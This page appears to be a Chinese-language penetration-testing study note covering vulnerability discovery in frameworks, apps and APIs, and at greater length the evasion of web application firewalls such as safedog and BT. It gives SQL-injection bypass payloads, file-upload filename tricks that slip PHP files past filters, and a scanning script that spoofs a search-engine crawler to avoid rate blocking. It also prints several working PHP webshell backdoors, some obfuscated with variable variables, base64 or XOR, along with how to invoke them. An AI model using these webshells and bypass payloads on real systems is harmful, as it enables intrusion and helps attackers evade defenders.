<h4 id="开发框架："><a href="#开发框架：" class="headerlink" title="开发框架："></a>开发框架：</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">如常见的thinkphp,	<span class="hljs-keyword">spring</span>, flask等开发的源码程序，这种源码程序正常的安全测试思路: 先获得对应的开发框架信息(名字，版本) ，通过公开的框架类安全问题对其进行测试，如不存在则采用白盒代码审计自行挖掘<br></code></pre></td></tr></table></figure>



<p><strong>Php:</strong></p>
<ul>
<li>Yii</li>
<li>Laravel</li>
<li>thinkphp - <a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></li>
</ul>
<p><strong>Java:</strong></p>
<ul>
<li>Shiro</li>
<li>Struts</li>
<li>Spring - <a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/spring/CVE-2018-1273/">https://vulhub.org/#/environments/spring/CVE-2018-1273/</a></li>
<li>Maven</li>
</ul>
<p><strong>Python:</strong></p>
<ul>
<li>Flask</li>
<li>Django</li>
<li>Tornado</li>
</ul>
<h4 id="未知CMS"><a href="#未知CMS" class="headerlink" title="未知CMS"></a>未知CMS</h4><p>在常见的企业或个人内部的源码中，也可以是某CMS经过二次开发的源码结构。对于此类源码程序的测试思路：</p>
<ul>
<li>当可以识别二次开发时按照已知CMS思路进行测试</li>
<li>当不能确定二次开发时，则采用常规综合类扫描工具（xray, awvs, appscan, 公司内部产品）或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜）</li>
<li>在有源码的情况下同样可以对其进行代码审计</li>
</ul>
<h3 id="APP应用漏洞发现"><a href="#APP应用漏洞发现" class="headerlink" title="APP应用漏洞发现"></a>APP应用漏洞发现</h3><p><img src="/img/18.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">App漏洞发现思路：<br>反编译提取URL或通过抓包抓取URL，然后对抓取的URL进行Web应用的测试。若果不存在或者是其他协议的情况下，则采用网络接口抓包进行数据获取，然后在进行其他协议的安全测试。<br><br>APP --&gt; Web  <span class="hljs-string">\</span>  APP --&gt; 其他  <span class="hljs-string">\</span>  APP --&gt;逆向<br></code></pre></td></tr></table></figure>



<h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>通过对APP应用进行抓包获取APP包信息，在对包内信息进行检验和测试</p>
<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p>通过对APP的apk包进行逆向对包中包含的信息进行检验和测试</p>
<h4 id="XRAY与Burp联合使用"><a href="#XRAY与Burp联合使用" class="headerlink" title="XRAY与Burp联合使用"></a>XRAY与Burp联合使用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/L0ading/</span>p/<span class="hljs-number">12388928</span>.html<br></code></pre></td></tr></table></figure>





<h3 id="API服务漏洞发现"><a href="#API服务漏洞发现" class="headerlink" title="API服务漏洞发现"></a>API服务漏洞发现</h3><h4 id="应用面"><a href="#应用面" class="headerlink" title="应用面"></a>应用面</h4><ul>
<li>产品管理</li>
<li>用户管理</li>
<li>支付管理</li>
<li>短信管理</li>
<li>订单管理</li>
</ul>
<h4 id="探针面"><a href="#探针面" class="headerlink" title="探针面"></a>探针面</h4><ul>
<li>爬虫参数</li>
<li>应用猜测</li>
<li>引擎查找</li>
</ul>
<h4 id="安全面"><a href="#安全面" class="headerlink" title="安全面"></a>安全面</h4><ul>
<li>逻辑越权</li>
<li>输入控制</li>
<li>接口安全</li>
<li>信息泄漏</li>
</ul>
<h4 id="利用面"><a href="#利用面" class="headerlink" title="利用面"></a>利用面</h4><ul>
<li>Soap UI PRO</li>
<li>WS-Attacker</li>
<li>Burp Suit</li>
</ul>
<h4 id="修复面"><a href="#修复面" class="headerlink" title="修复面"></a>修复面</h4><ul>
<li>打补丁 &#x2F; 升级版本 &#x2F; WAf</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">端口服务类安全测试:</span><br><span class="hljs-section">通过前期信息收集针对目标端口服务类探针后进行的安全测试，主要包含的方法有: 口令安全、WEB类漏洞、版本漏洞等。其中的危害可大可小。属于端口类服务与第三方服务的安全测试面，是一般在已知应用无思路的情况下使用的安全测试方案。</span><br><br>API接口-WebService RESTful API<br>其中根据应用自身功能决定，安全测试目标需要有API接口调用才能进行此类测试，其中主要涉及的安全问题有：自身安全、配合WEB、业务逻辑等，其中的危害可大可小，属于应用API接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。<br><br>WSDL（网络服务描述语言Web Services Description Language）是一款基于xml的语言，用于描述Web Services以及如何对他们进行访问。<br></code></pre></td></tr></table></figure>





<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">漏洞发现：<br><span class="hljs-number">1</span>.系统漏洞发现主要借助于MSF，<span class="hljs-keyword">nmap</span>等扫描工具；<br><span class="hljs-number">2</span>.web漏洞主要借助目前市面上已知的<span class="hljs-built_in">exp</span><br><span class="hljs-number">3</span>.app可以先将网址抓到，然后再做渗透<br><span class="hljs-number">4</span>.wsdl接口服务将链接丢到awvs里面跑<br></code></pre></td></tr></table></figure>





<h1 id="五、WAF绕过"><a href="#五、WAF绕过" class="headerlink" title="五、WAF绕过"></a>五、WAF绕过</h1><img src="/img/19.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />



<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>​		<strong>WAF绕过第一步便是信息收集，唯有信息得到有效的收集才会让接下来的步骤进行下去。</strong></p>
<h4 id="测试的WAF"><a href="#测试的WAF" class="headerlink" title="测试的WAF"></a><strong>测试的WAF</strong></h4><ul>
<li>aliyun-os</li>
<li>BT</li>
<li>safedog — <strong>默认拦截机制分析绕过—未开CC</strong></li>
</ul>
<h4 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a><strong>绕过分析</strong></h4><ul>
<li>抓包技术</li>
<li>WAF说明</li>
<li>FUZZ模糊测试</li>
</ul>
<h4 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a><strong>绕过手法</strong></h4><ul>
<li>数据包特性<ul>
<li>请求方法 — <strong>通过更改GET、POST等方法对目标网站进行扫描</strong></li>
<li>模拟用户 — <strong>通过更改User-agent以达到模拟为正常用户的访问方式</strong></li>
<li>爬虫引擎 — <strong>这个不是通用的，这个属于部分WAF上面的一个特有的性值。WAF上面有黑白名单机制。在网站中加入到黑名单就代表禁止访问。白名单就是不进行拦截，符合规则可以任意访问。</strong></li>
<li>白名单机制 — <strong>处在白名单中的IP用户，任何请求都不会被拦截。必要的时候可以通过更改自己的IP伪造成白名单中的IP用户</strong></li>
</ul>
</li>
<li>请求速度<ul>
<li>延时 — <strong>当测试网站的WAF存在流量防护的时候通过设置延时绕过WAF绕过</strong></li>
<li>代理池 — <strong>代理就是你的请求先发到代理服务器上，代理服务器再转发给目标服务器。当WAF将攻击IP进行封锁之后便需要代理池技术对IP进行更换来绕过WAF</strong></li>
<li>爬虫引擎 — <strong>通过使用Baidu、Google等爬虫引擎绕过WAF的流量防护</strong></li>
<li>白名单机制</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">当直接对网站进行信息收集时，会触发WAF，但这些信息还是我们需要知道的（例如：目录扫描，从而得到敏感文件，上传地址等等），这是在信息收集部分中非常重要的一部分。从而就需要我们绕过WAF从而得到这些信息。<br><br>这一部分会触发WAF拦截，所以我们需要分析它的规则，这就需要我们进行绕过分析（抓包分析，WAF说明，FUZZ测试）。然后我们根据他的结果来想相应的绕过手法。<br><br>CC检测会对你的访问速度和访问来源进行检测，CC检测此时拦截是当检测到你此时的访问不正常(这里是访问速度过快了)，不像是正常的用户访问，就会拦截。<br><br>CC 攻击与 DDOS攻击 - CC 攻击就是 DDOS 攻击的一种攻击类型。CC 攻击是它的一种攻击方式。<br><br>CC 攻击模拟多个用户(多少线程就是多少用户)不停地进行访问(访问那些需要大量数据操作，就是需要大量 CPU 时间的页面).这一点用一个一般的性能测试软件 就可以做到大量模拟用户并发。CC 攻击的原理就是攻击者控制某些主机不停地 发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。<br><br>ddos 攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动攻击，从而成倍地提高拒绝服务攻击的威力。ddos 的攻击方式有很多种，最基本的 ddos 攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。<br><br>ddos 攻击和 cc 攻击区别主要是针对对象的不同。ddos 攻击是主要针对 IP 的攻击，而 CC 攻击的主要是网页。CC 攻击相对来说，攻击的危害不是毁灭性的，但是持续时间长;而 ddos 攻击就是流量攻击，这种攻击的危害性较大，通过向目标服务器发 送大量数据包，耗尽其带宽，更难防御。<br><br>可以通过Python编写脚本进行爬取:<br><span class="hljs-comment">#搜索引擎爬虫模拟及模拟真实用户</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>headers=&#123;<br>  <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>  <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span>,<br>  <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>  <span class="hljs-comment">#模拟用户Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br>  <span class="hljs-comment">#模拟引擎Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br>  <span class="hljs-comment">#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html</span><br>  <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span>,<br>  <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>  <span class="hljs-string">&#x27;Accept&#x27;</span>:<br>  <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,<br>  <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;none&#x27;</span>,<br>  <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>  <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>  <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span>,<br>  <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,<br>  <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-comment">#根据当前访问cookie</span><br>&#125;<br><span class="hljs-keyword">for</span> paths <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;php_b.txt&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>url=<span class="hljs-string">&#x27;http://192.168.0.103:8081/&#x27;</span><br>paths=paths.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>urls=url+paths<br><span class="hljs-comment">#如需测试加代理，或加入代理池需加代理</span><br>proxy = &#123;<br>	<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1:7777&#x27;</span><br>&#125;<br><span class="hljs-keyword">try</span>:<br>code=requests.get(urls,headers=headers,verify=<span class="hljs-literal">False</span>).status_code<br><span class="hljs-built_in">print</span>(urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(code))<br><span class="hljs-keyword">if</span> code==<span class="hljs-number">200</span> <span class="hljs-keyword">or</span> code==<span class="hljs-number">403</span>:<br><span class="hljs-built_in">print</span>(urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(code))<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connecting error&#x27;</span>)<br><span class="hljs-comment">#time.sleep(3)模拟用户需延时引擎可用可不用（根据请求速度）</span><br></code></pre></td></tr></table></figure>



<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a><strong>工具：</strong></h4><ul>
<li>综合工具<ul>
<li>awvs — <strong>awvs+xray漏扫Payload绕过-延时白名单burpsuite作为中转</strong></li>
<li>xray</li>
<li>appscan</li>
</ul>
</li>
<li>单点工具<ul>
<li>tpscan</li>
<li>wpscan</li>
<li>st2scan</li>
</ul>
</li>
</ul>
<h4 id="触发："><a href="#触发：" class="headerlink" title="触发："></a><strong>触发：</strong></h4><ul>
<li>扫描速度<ul>
<li>延时</li>
<li>代理池</li>
<li>白名单</li>
</ul>
</li>
<li>工具指纹<ul>
<li>特征修改</li>
<li>模拟用户</li>
</ul>
</li>
<li>漏洞Payload<ul>
<li>数据变异</li>
<li>冷门扫描 — <strong>当扫描器的测试语句触发WAF规则后，该工具就可能会跑不出漏洞。每个工具的验证漏洞的方式不一样所以测试的时候需要多款工具</strong></li>
</ul>
</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="SQL注入-WAF-绕过"><a href="#SQL注入-WAF-绕过" class="headerlink" title="SQL注入-WAF 绕过"></a>SQL注入-WAF 绕过</h4><ul>
<li><p>手工注入绕过</p>
<ul>
<li><p>敏感字符绕过 如 union，ordery by 等相关关键字 使用&#x2F;**&#x2F; (注释)绕过 WAF 对敏感字段的查询如 database();</p>
<p>ex: database 后使用 database&#x2F;**&#x2F;</p>
</li>
<li><p>联合绕过 %23 代表 # 、%0A 代表一个换行符 union %23a%0Aselect 1,2,3;%23</p>
<p>ex: id&#x3D;1%20union %23a%0Aselect 1,2,3;%23</p>
</li>
<li><p>id&#x3D;1%20union&#x2F;*!44509select*&#x2F;%201,2,3 （大于 4.4509 版 本运行） &#x2F;*!x*&#x2F; 代表当 mysql 数据库版本大于 x 时, mysql 不再当作注 释，从而将其运行，这是 mysql 的特性</p>
</li>
</ul>
</li>
<li><p>Sqlmap 工具绕过</p>
<ul>
<li><p>绕过指纹识别</p>
<p>需要伪装 UA（–user-agent&#x3D;”Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; +<a target="_blank" rel="noopener" href="http://www.baidu.com/search/spider.html)&quot;">http://www.baidu.com/search/spider.html)&quot;</a> 或者–random-agent） 或者修改sqlmap下自带的sqlmap.conf 文件下的 agent 也可达到效果</p>
</li>
<li><p>绕过敏感字段识别</p>
<p>用到自带模块（–tamper&#x3D;rdog.py ）</p>
</li>
<li><p>绕过 CC 防护</p>
<p>用上代理池（–proxy&#x3D;http:&#x2F;IP:port）</p>
</li>
</ul>
</li>
<li><p>宝塔基础上绕过</p>
<p>BTWAF 会对&#x2F;*关键字进行拦截，所以在上述的基础上想绕过 BT 就需要使用截断技术，故在每个&#x2F;*前面加上%00 即可绕过了</p>
</li>
<li><p>截断条件</p>
<p>PHP 版本小于 5.3.4 2. php.ini 中的 magic_quotes_gpc 设置为 Off</p>
<p>magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有:post、 get、cookie 过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据 库语句因为特殊字符引起的污染而出现致命的错误。</p>
</li>
</ul>
<h4 id="文件上传-WAF-绕过"><a href="#文件上传-WAF-绕过" class="headerlink" title="文件上传-WAF 绕过"></a>文件上传-WAF 绕过</h4><ul>
<li><p>数据溢出</p>
<p>WAF 一般检测上传参数的位置，所以在上传参数构造垃圾数据使其溢出</p>
<p>垃圾数据写入的位置：最后以分号结尾。在分号与数据之间进行垃圾数据写入</p>
</li>
<li><p>符号变异</p>
<p>就是在抓包中修改 filename 的值，将 filename 中的一个双引号去除 使得 waf 无法获取双引号的内容，从而无法检测出执行文本，达到绕过的效果。</p>
<p>利用的是双引号里的是一个字符串， 但是当我们把一个双引号去除后，就会变成了一个变量或其它值，从而不会被WAF检测成一个字符串</p>
</li>
<li><p>分号绕过 — <code>filename=&quot;a.jpg;.php&quot;</code></p>
<p>由于分号代表一个语句的结束，所以当我们使用分号后，WAF 检测到的是 a.jpg 文件名，对于后面的文件被忽略了也就没检测到，使得绕过了</p>
</li>
<li><p>换行绕过</p>
<p>利用 WAF 读取换行时为\n ，而数据包却能完整的去读出来换行 如下：WAF 读取到的为 filename 为 x.\np\nh\np 从而 WAF 无法获取到 php 的执行文件达到 绕过效果</p>
</li>
<li><p>重复数据</p>
<ul>
<li><p>借助原有数据绕过 — <code>filename=&quot;Content-Disposition : form-data;name=&quot;upload_file&quot; ; x.php&quot;</code></p>
<p>利用 content-Disposition:* from-data; name&#x3D;”upload_file”; 的值带入 filename 中, 从而使得 WAF 在检测时直接检测到 filename 为 content-Disposition:* from-data; name&#x3D;”upload_file”; 从而作为白名单而绕过了 WAF 而服务器接收到的确实 x.php</p>
</li>
<li><p>利用白名单绕过 — <code>filename=&quot;x.jpg&quot; ; filename=&quot;x.jpg&quot; ; . . . ..filename=&quot;x.php&quot;</code></p>
<p>重复构造 filename&#x3D;”*.jpg” 最后在以 filename&#x3D;”*.php”结尾从而利用递归的问题, 绕过了 WAF,类似前面的文件上传后端部分的双写绕过</p>
</li>
</ul>
</li>
</ul>
<h4 id="XSS-WAF-绕过"><a href="#XSS-WAF-绕过" class="headerlink" title="XSS-WAF 绕过"></a>XSS-WAF 绕过</h4><p><strong>手工 XSS 绕过:</strong></p>
<ul>
<li>标签语法替代</li>
<li>特殊符号干扰</li>
<li>提交方式更改</li>
<li>垃圾数据溢出</li>
<li>加密解密算法</li>
<li>结合其它漏洞绕过</li>
</ul>
<p>**XSStrike 工具绕过 **</p>
<p>使用延时或者代理池绕过 CC 即可 –timeout 或者–proxy</p>
<p>模糊测试–fuzzer,该模糊器旨在测试过滤器和 Web 应用程序防火墙，可使用-d 选项将延迟设 置为 1 秒。****</p>
<h4 id="RCE-WAF-绕过"><a href="#RCE-WAF-绕过" class="headerlink" title="RCE-WAF 绕过"></a>RCE-WAF 绕过</h4><p><strong>加密解密绕过：</strong></p>
<p>可逆 base64，url 编码 不可逆 md5</p>
<p>注意：不能在可变变量中传入 base64_decode() 函数因为，会被 BT 拦截，所以一般该方式行不通就会换成下面的方式。</p>
<p><strong>关键字绕过：</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">如 phpinfo();  可以替换成如下写法： <span class="hljs-symbol">$y</span>=str_replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;pxhpxinxfo()&#x27;</span>);assert(<span class="hljs-symbol">$y</span>);<br></code></pre></td></tr></table></figure>



<p><strong>提交方法：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">利用变量覆盖加上请求方法达到该效果，如本来是 POST 方法，修改后变成 <span class="hljs-built_in">GET</span> 方法从而达到绕过 WAF<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>$<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;y&#x27;</span>];<br><span class="hljs-variable">$b</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;z&#x27;</span>]);<br></code></pre></td></tr></table></figure>



<h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><img src="/img/20.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />

<h4 id="后门绕过（代码）："><a href="#后门绕过（代码）：" class="headerlink" title="后门绕过（代码）："></a><strong>后门绕过（代码）：</strong></h4><ul>
<li><p><strong>简单后门 — 无法绕过</strong></p>
<p>WAF PHP 脚本为例:</p>
<?php @eval($_POST['x']); ?>

<?php assert($_POST['x']); ?>

<p>简单后门只是用于简单的学习,而在真实环境中，该后门语句会被直接被 WAF 所检测到，此时就需要我们进行简单的变换。</p>
<p>注意：一般情况下多数用 assert 函数因为 assert 能写入变量执行，而 eval 却不行</p>
</li>
<li><p><strong>变量覆盖</strong></p>
<p>WAF 检测不到可变的变量时，就会放行也就是无法检测到木马后门文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">后门语句 :<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-variable">$$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;y&#x27;</span>];<br>    <span class="hljs-variable">$b</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;z&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br>利用：<br>例如：后门文件为 <span class="hljs-number">1</span>.php 则，在服务器上使用 http:<span class="hljs-comment">//IP/1.php?x=b&amp;y=assert 即可 实现因为这样赋值后$a=b $$a=$b=assert 所以直接变成了 assert($_POST[‘z’]);</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>加密传输</strong></p>
<p>当后门直接调用 system|phpinfo 等敏感字段时会被 BT 所拦截，尤其是 BT 的 WAF 会拦截 &#x2F;* 字符的出现，所以在绕过时就需要配合截断(%00)，去处理或者相关加密技术在上述调用 phpinfo() 时，是没开启 BT 的，开启 safedog 模式，所以没有出现拦截， 一旦开启了 BT，就会对特殊的关键词进行拦截。所以就衍生了加密的方式进行绕过，因为 BT 只对指定的字段进行加密，所以可以从加 密方面进行字段上的绕过，如典型的可逆的 base64 编码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">后门语句 :<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-variable">$$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;y&#x27;</span>];<br>    <span class="hljs-variable">$b</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;z&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br>利用:在对z的值进行传输是要先对z的值进行base64加密<br>注:在 BT 里是会变量进行关键词检测的，也就是如果在变量里出现 base64 字段就会进行拦截，不过此时在这并没有在变量中调用 base64，而是后门文件中调用了，所以不拦截。<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>加密混淆</strong></p>
<p>既然可以加密传输，就会有其它加密的方法，所以便有了加密混淆使得 WAF 软件无法检测到关键字段同样达到 WAF 的绕过</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">PHP 混淆加密脚本下载地址： https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/djunny/</span>enphp<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>借用在线 API 接口实现加密混淆</strong></p>
<p>一旦当加密混淆过不了安全狗或者 BT 等其它防护工具时，可以借助网上在线 API 接口进行实现加密混淆</p>
</li>
<li><p><strong>异或加密 Webshell-venom</strong></p>
<p>同样也是进行混淆代码，只是与加密混淆不同的，该方法利用的是异或加密，不断随机的产生不同的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">生成代码:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CEKF</span></span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-variable">$SPOE</span>=<span class="hljs-string">&#x27;gK$JP&gt;&#x27;</span>^<span class="hljs-string">&quot;\x6\x38\x57\x2f\x22\x4a&quot;</span>; <span class="hljs-keyword">return</span> @<span class="hljs-variable">$SPOE</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$this</span>-&gt;ZDFP&quot;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-variable">$cekf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CEKF</span>();<br>@<span class="hljs-variable">$cekf</span>-&gt;ZDFP=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mr6&#x27;</span>]):<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27; mr6&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br>利用:通过简单观察代码可以发现存在三目运算符，所以当存在 id=<span class="hljs-number">1</span> 时，就会使用 base64_decode 解码操作，又因为有 WAF 的存在，不能直接传入敏感字段，所以在 mr6 就进行 base64 编码形式<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="权限软件"><a href="#权限软件" class="headerlink" title="权限软件"></a>权限软件</h4><p><strong>菜刀：未更新状态，无插件，单向加密传输</strong></p>
<p><strong>蚁剑：更新状态，有插件，拓展性强，单向加密传输</strong></p>
<p><strong>冰蝎：更新状态，未知插件，双向加密传输</strong> — 双向加密，从而达到 WAF 也无法检测响应的数据包从而检测到敏感字段而拦截， 是相对其他工具来说较好的。</p>
<blockquote>
<p>单双向加密传输的区别： 双向加密传输就是发包之前已经加密了，并且从服务器传回来的数据也是加密的，这样在安全狗这些 WAF 检测内容的时候就很 nice。</p>
</blockquote>
<h4 id="自己造轮子"><a href="#自己造轮子" class="headerlink" title="自己造轮子"></a>自己造轮子</h4><blockquote>
<p>由于目前很多权限工具都被 WAF 所识别了相关特征（如菜刀、蚁剑、冰蝎等）， 会导致无法使用权限漏洞去控制相关内容，从而就需要我们通过写入相关函数从 而达到想要获取的目的</p>
</blockquote>
